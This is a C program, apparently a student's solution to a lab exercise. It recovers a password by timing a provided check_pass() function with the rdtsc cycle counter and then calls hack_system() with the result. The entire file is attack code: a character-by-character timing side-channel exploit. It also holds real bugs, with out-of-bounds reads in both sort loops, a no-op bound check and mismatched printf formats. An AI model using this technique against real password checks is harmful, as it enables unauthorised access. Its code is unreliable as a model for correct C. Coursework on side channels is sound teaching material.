#include <stdio.h>
#include <string.h>
#include <unistd.h>

// include our "system" header
#include "sysapp.h"

// Read cycle counter
#define rdtsc() ({ unsigned long a, d; asm volatile("rdtsc":"=a" (a), "=d" (d)) ; a; })

int main(int argc, char **argv) {
    char guess[33];
    long a,d,f,g;
    
    long timer[94];
    // set guess to zeros
    bzero(guess, sizeof(guess));
    //guess = "IsNotSecret\0";
    //if(check_pass(guess)){hack_system(guess);}
    //
    // do the guessing (this is where your code goes)
    //   we suggest a loop over the size of the possible
    //   password, each time trying all possible characters
    //   and looking for time deviations
    //
    a = rdtsc();
    check_pass(guess);
    //char c = 73;
    //guess[0]=c;
    //c = 115;
    //guess [1] = 115;
    for (char c = 33; c<127;c++){
        guess[0] = c;
	a = rdtsc();
	check_pass(guess);
	d = rdtsc();
    	f = d-a;
	timer[c-33]=f;
    }
    for (int i=0; i<94-1;i++){
        for(int j = 0;j<94-i;j++){
	    if(timer[j]<=timer[j+1]){
	        long t = timer[j];
		timer[j] = timer[j+1];
		timer[j+1] = t;
	     }else
	     continue;
	}
    }
    long median = (timer[94/2]+timer[94/2+1])/2.0;
    //printf("%d\n",median);
    for (int e=0;e<12;e++){
    long timer[94];
    for (char c = 33; c<127; c++){
        guess[e] =c;
    long counter[1000];
    for (int q = 0; q<1000;q++){	
	a = rdtsc();
	check_pass(guess);	
    //if (check_pass(guess)) {
    //    printf("Password Found!\n");
    //    hack_system(guess);
    //};
	d = rdtsc();
	f = d-a;
	//printf("%d\t",f/(i+2));
	//if(f/(i+2)>median-50&&f/(i+2)<median+100){
	//    printf(guess);
	//    printf("%d",f/(i+2));
	//    printf("\n");
	//}
	//timer[c-33] = f;
	counter[q] = f;
    }
    for ( int q =0; q<1000-1;q++){
        for(int w = 0;w<1000-q;w++){
	    if (counter[w]<=counter[w+1]){
 	        long t = counter[w];
		counter[w] = counter[w+1];
		counter[w+1] = t;
	    }else
	    continue;
	}
    }
    long time=(counter[1000/2]+counter[1000/2+1])/2.0;
    timer[c-33] = time;
    }	    
    long z = 0;
    int j;
    int index;
    for (j = 0;j<94; j++){
	long x = timer[j];
	if (z<x && j<20000){
	    z=x;
	    index = j;
	}
	       
        //printf("%d\t",timer[j]); 
    }
    //printf("%d\t",index);
    for (int i =0; i <94;i++){printf("%d %c\t",timer[i],i+33);}
    printf("\n");
    guess[e] = index+33;
    guess[e+1] = 0;
    if (check_pass(guess)){hack_system(guess);}
    }
    printf("Could not get the password!  Last guess was %s\n", guess);
    return 1;
};
